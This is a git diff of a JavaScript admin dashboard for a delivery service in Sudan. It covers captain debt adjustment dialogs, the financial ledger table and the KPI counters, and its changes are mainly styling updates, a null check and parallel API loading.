     const sel = document.getElementById('addDebtCaptainSelect');
     const captain = allCaptainsList.find(c => c._id === sel.value);
     const balEl = document.getElementById('addDebtCurrentBalance');
-    if (captain) {
-        const bal = captain.wallet_balance ?? 0;
-        balEl.value = `${bal.toFixed(0)} ج.س`;
-        balEl.style.color = bal < 0 ? 'var(--danger)' : 'var(--brand)';
-    } else {
-        balEl.value = '';
-        balEl.style.color = '';
+    if (balEl) {
+        if (captain) {
+            const bal = captain.wallet_balance ?? 0;
+            balEl.value = `${bal.toFixed(0)} ج.س`;
+            balEl.style.color = bal < 0 ? 'var(--danger)' : 'var(--primary)';
+        } else {
+            balEl.value = '';
+            balEl.style.color = '';
+        }
     }
 }
 
@@ -1495,22 +1699,20 @@ async function addDebt() {
 }
 
 async function quickAdjustDebt(captainId, balance, mode) {
-    // الاسم يُقرأ من البيانات المحمَّلة لا من وسيط في الـ HTML (انظر التعليق عند الزر)
     const captainName = (allCaptainsList.find(c => c._id === captainId) || {}).name || 'الكابتن';
     let amount = null;
     if (mode === 'partial') {
         const { value: val } = await Swal.fire({
-            // titleText لا title: الأخير يقبل HTML، والاسم يكتبه المستخدم
             titleText: `نقص جزء من مديونية ${captainName}`,
             html: `
-                <p style="color:#718096;font-size:13px;margin-bottom:12px;">المديونية الحالية: <strong style="color:#e53e3e;">${Math.abs(balance).toFixed(0)} ج.س</strong></p>
+                <p style="color:var(--muted);font-size:13px;margin-bottom:12px;">المديونية الحالية: <strong style="color:var(--danger);">${Math.abs(balance).toFixed(0)} ج.س</strong></p>
                 <input id="quickDebtInput" type="number" min="1" step="100" placeholder="المبلغ المراد خصمه"
-                    style="width:100%;padding:12px;border:2px solid #e2e8f0;border-radius:10px;font-size:15px;font-weight:700;text-align:center;font-family:Cairo;">
+                    style="width:100%;padding:12px;border:2px solid var(--border);border-radius:10px;font-size:15px;font-weight:700;text-align:center;font-family:Cairo;">
             `,
             showCancelButton: true,
             confirmButtonText: 'تأكيد الخصم',
             cancelButtonText: 'إلغاء',
-            confirmButtonColor: '#d97706',
+            confirmButtonColor: '#f59e0b',
             cancelButtonColor: '#64748b',
             preConfirm: () => {
                 const v = parseFloat(document.getElementById('quickDebtInput').value);
@@ -1526,34 +1728,33 @@ async function quickAdjustDebt(captainId, balance, mode) {
 
 async function _sendDebtAdjust(captainId, captainName, currentBalance, mode, amount, note) {
     let label;
-    if (mode === 'zero')    label = 'تصفير المديونية بالكامل';
+    if (mode === 'zero')         label = 'تصفير المديونية بالكامل';
     else if (mode === 'partial') label = `خصم ${amount} ج.س من المديونية`;
-    else                    label = `إضافة مديونية ${amount} ج.س`;
+    else                         label = `إضافة مديونية ${amount} ج.س`;
 
-    const confirmColor = mode === 'zero' ? '#ef4444' : mode === 'add' ? '#f97316' : '#d97706';
+    const confirmColor = mode === 'zero' ? '#ef4444' : mode === 'add' ? '#f97316' : '#f59e0b';
 
     const balanceHtml = mode === 'add'
-        ? `<p>الرصيد الحالي: <strong style="color:${currentBalance < 0 ? '#e53e3e' : '#04553A'};"></strong>${currentBalance.toFixed(0)} ج.س</p>
-            <p>الرصيد بعد الإضافة: <strong style="color:#e53e3e;">${(currentBalance - amount).toFixed(0)} ج.س</strong></p>`
-        : `<p>المديونية الحالية: <strong style="color:#e53e3e;">${Math.abs(currentBalance).toFixed(0)} ج.س</strong></p>`;
+        ? `<p>الرصيد الحالي: <strong>${currentBalance.toFixed(0)} ج.س</strong></p>
+           <p>الرصيد بعد الإضافة: <strong style="color:var(--danger);">${(currentBalance - amount).toFixed(0)} ج.س</strong></p>`
+        : `<p>المديونية الحالية: <strong style="color:var(--danger);">${Math.abs(currentBalance).toFixed(0)} ج.س</strong></p>`;
 
     const confirm = await Swal.fire({
         title: `⚠️ تأكيد: ${label}`,
         html: `
-            <div style="text-align:right;direction:rtl;font-size:14px;line-height:2;">
+            <div style="text-align:right;direction:rtl;font-size:14px;line-height:2;font-family:Cairo;">
                 <p>الكابتن: <strong>${esc(captainName)}</strong></p>
                 ${balanceHtml}
                 <p>الإجراء: <strong style="color:${confirmColor};">${label}</strong></p>
-                ${note ? `<p style="color:#718096;font-size:12px;">السبب: ${esc(note)}</p>` : ''}
-                ${mode === 'zero' ? '<p style="color:#718096;font-size:12px;">سيُصفَّر الرصيد كاملاً وسيُرفع الحجب إن وجد.</p>' : ''}
-                ${mode === 'add' ? '<p style="color:#f97316;font-size:12px;">سيتم حجب الكابتن تلقائياً إذا تجاوز الحد الائتماني.</p>' : ''}
+                ${note ? `<p style="color:var(--muted);font-size:12px;">السبب: ${esc(note)}</p>` : ''}
             </div>`,
         icon: 'warning',
         showCancelButton: true,
-        confirmButtonText: 'نعم، تأكيد',
+        confirmButtonText: 'نعم، تأكيد الإجراء',
         cancelButtonText: 'إلغاء',
         confirmButtonColor: confirmColor,
-        cancelButtonColor: '#64748b'
+        cancelButtonColor: '#64748b',
+        fontFamily: 'Cairo'
     });
     if (!confirm.isConfirmed) return;
 
@@ -1574,7 +1775,6 @@ async function _sendDebtAdjust(captainId, captainName, currentBalance, mode, amo
             if (data.isBlocked)   msg += ' 🔴 — تم حجب الحساب تلقائياً';
             toast(msg, mode === 'add' ? 'error' : 'success');
 
-            // Clear add-debt form fields
             if (mode === 'add') {
                 document.getElementById('addDebtAmount').value = '';
                 document.getElementById('addDebtNote').value = '';
@@ -1582,6 +1782,7 @@ async function _sendDebtAdjust(captainId, captainName, currentBalance, mode, amo
                 document.getElementById('addDebtCaptainSelect').value = '';
             }
 
+            bust();
             await loadIndebtedCaptains();
             await loadBlockedCaptains();
             await loadKPIs();
@@ -1595,7 +1796,7 @@ async function _sendDebtAdjust(captainId, captainName, currentBalance, mode, amo
 }
 
 // ──────────────────────────────────────────
-// FINANCIAL LEDGER
+// LEDGER
 // ──────────────────────────────────────────
 async function loadLedger() {
     const tbody = document.getElementById('ledgerTableBody');
@@ -1611,10 +1812,10 @@ async function loadLedger() {
     if (to)   url += `to=${to}&`;
 
     const typeConfig = {
-        commission:   { label: 'عمولة توصيل', cls: 'approved', icon: 'percentage',       color: '#04553A' },
-        debt_add:     { label: 'إضافة دين',    cls: 'rejected', icon: 'minus-circle',     color: '#e53e3e' },
-        debt_zero:    { label: 'تصفير دين',    cls: 'pending',  icon: 'times-circle',     color: '#d97706' },
-        debt_partial: { label: 'خصم جزئي',    cls: 'pending',  icon: 'minus-circle',     color: '#d97706' },
+        commission:   { label: 'عمولة توصيل', cls: 'approved', icon: 'percentage',   color: 'var(--primary)' },
+        debt_add:     { label: 'إضافة دين',    cls: 'rejected', icon: 'minus-circle', color: 'var(--danger)' },
+        debt_zero:    { label: 'تصفير دين',    cls: 'pending',  icon: 'times-circle', color: 'var(--warning)' },
+        debt_partial: { label: 'خصم جزئي',    cls: 'pending',  icon: 'minus-circle', color: 'var(--warning)' },
     };
 
     try {
@@ -1630,13 +1831,13 @@ async function loadLedger() {
         tbody.innerHTML = data.entries.map(e => {
             const cfg  = typeConfig[e.type] || typeConfig.commission;
             const date = new Date(e.date).toLocaleString('ar-SA', { year:'numeric', month:'short', day:'numeric', hour:'2-digit', minute:'2-digit' });
-            const cityLbl = e.city === 'Khartoum' ? '<span style="background:#dbeafe;color:#1d4ed8;border-radius:30px;padding:2px 10px;font-size:11px;"><i class="fas fa-city"></i> الخرطوم</span>'
-                          : '<span style="background:#e0f2fe;color:#0369a1;border-radius:30px;padding:2px 10px;font-size:11px;"><i class="fas fa-anchor"></i> بورتسودان</span>';
+            const cityLbl = e.city === 'Khartoum' ? '<span style="background:rgba(59,130,246,0.1);color:#1d4ed8;border-radius:30px;padding:2px 10px;font-size:11px;"><i class="fas fa-city"></i> الخرطوم</span>'
+                          : '<span style="background:rgba(14,165,233,0.1);color:#0369a1;border-radius:30px;padding:2px 10px;font-size:11px;"><i class="fas fa-anchor"></i> بورتسودان</span>';
             return `<tr>
                 <td><span class="status-badge ${cfg.cls}" style="font-size:11px;"><i class="fas fa-${cfg.icon}"></i> ${cfg.label}</span></td>
                 <td style="font-size:12px;color:var(--muted);">${date}</td>
                 <td>
-                    <div style="font-weight:700;font-size:13px;">${esc(e.captain?.name) || '—'}</div>
+                    <div style="font-weight:700;font-size:13px;color:var(--text);">${esc(e.captain?.name) || '—'}</div>
                     <div style="font-size:11px;color:var(--muted);">${esc(e.captain?.phone)}</div>
                 </td>
                 <td>${cityLbl}</td>
@@ -1651,10 +1852,60 @@ async function loadLedger() {
 }
 
 // ──────────────────────────────────────────
+// KPIS
+// ──────────────────────────────────────────
+async function loadKPIs() {
+    try {
+        // ⚡ الثلاثة معاً لا واحداً بعد واحد: كانت متسلسلة بـ await فيدفع
+        // المستخدم ثمن ثلاث رحلات شبكة متتابعة قبل ظهور أول رقم.
+        // والمعلّقة تُشتقّ من القائمة الكاملة بدل نداءٍ ثانٍ لنفس المورد.
+        const [allReqs, captains, dash] = await Promise.all([
+            once('/api/admin/payment-requests'),
+            once('/api/admin/captains'),
+            once('/api/admin/dashboard')
+        ]);
+
+        const pendingReqs = Array.isArray(allReqs) ? allReqs.filter(r => r.status === 'pending') : [];
+        const kpiPending = document.getElementById('kpiPending');
+        if (kpiPending) kpiPending.textContent = Array.isArray(allReqs) ? pendingReqs.length : '—';
+
+        const blocked  = captains.filter(c => c.is_blocked);
+        const warning  = captains.filter(c => {
+            if (c.is_blocked) return false;
+            const b = c.wallet_balance ?? 0;
+            const l = c.credit_limit   ?? -5000;
+            if (l === 0) return false;
+            return (b / l) >= 0.8;
+        });
+
+        const kpiB = document.getElementById('kpiBlocked');
+        const kpiW = document.getElementById('kpiWarning');
+        if (kpiB) kpiB.textContent = blocked.length;
+        if (kpiW) kpiW.textContent = warning.length;
+
+        const kpiR = document.getElementById('kpiRevenue');
+        if (kpiR) {
+            const breakdown = dash.stats?.revenueBreakdown;
+            kpiR.textContent = `${(dash.stats?.revenue || 0).toLocaleString()} ج.س`;
+            if (breakdown) {
+                const tooltip =
+                    `عمولات الطلبات: ${breakdown.ordersRevenue.toLocaleString()} ج.س\n` +
+                    `مديونيات مُضافة: +${breakdown.debtAdded.toLocaleString()} ج.س\n` +
+                    `مديونيات مُعفاة: −${breakdown.debtForgiven.toLocaleString()} ج.س\n` +
+                    `─────────────────\n` +
+                    `الصافي: ${breakdown.netRevenue.toLocaleString()} ج.س`;
+                kpiR.title = tooltip;
+                kpiR.style.cursor = 'help';
+            }
+        }
+
+    } catch (e) { console.warn('KPI error:', e.message); }
+}
+
+// ──────────────────────────────────────────
 // INIT
 // ──────────────────────────────────────────
 document.addEventListener('DOMContentLoaded', async () => {
-    // Set today as default date for ledger
     const today = new Date().toISOString().split('T')[0];
     const firstOfMonth = new Date(new Date().getFullYear(), new Date().getMonth(), 1).toISOString().split('T')[0];
     const fromEl = document.getElementById('ledgerFrom');
